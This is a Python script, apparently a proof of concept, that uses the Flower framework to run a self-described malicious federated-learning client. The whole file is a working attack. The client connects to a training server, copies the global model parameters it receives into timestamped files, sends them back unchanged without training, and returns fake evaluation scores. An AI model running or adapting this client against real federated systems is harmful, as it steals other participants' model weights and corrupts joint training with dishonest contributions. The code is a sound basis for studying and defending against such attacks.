# libraries used
import flwr as fl  # flower framework for federated learning
import numpy as np  # numpy for saving and manipulating model parameters
import os  # os for handling file operations and directories
import time  # time for timestamping saved parameters

# class for a malicious client that extracts and saves model parameters
class MaliciousClient(fl.client.NumPyClient):
    
    def __init__(self, output_dir: str):
        self.output_dir = output_dir  # directory where the extracted parameters will be saved
        os.makedirs(self.output_dir, exist_ok=True)  # create the output directory if it doesn't exist

    # method for retrieving parameters; in this case, the malicious client does not send its own parameters
    def get_parameters(self, config):
        return None  # returning None as this client doesn't send any parameters

    # method to extract and save the model parameters sent by the server
    def fit(self, parameters, config):
        print("Extracted Model Parameters:", parameters)
        
        # create a timestamp to save files uniquely
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        
        # iterate over the model parameters and save each one in the output directory
        for idx, param in enumerate(parameters):
            filename = os.path.join(self.output_dir, f"parameter_{timestamp}_{idx}.npy")  # save with timestamp
            np.save(filename, param)  # save the parameter as a .npy file
            print(f"Saved parameter {idx} to {filename}")
        
        return parameters, 0, {}  # return parameters as is, with no changes

    # method to fake evaluation; returns dummy values
    def evaluate(self, parameters, config):
        return 0.0, 0, {}  # return fake evaluation results

# specify the directory to save extracted parameters
output_directory = "extracted_parameters"

# start the malicious client to connect to the federated learning server
fl.client.start_numpy_client(
    server_address="localhost:8000",  # connect to the server at localhost:8000
    client=MaliciousClient(output_dir=output_directory)  # use the malicious client
)
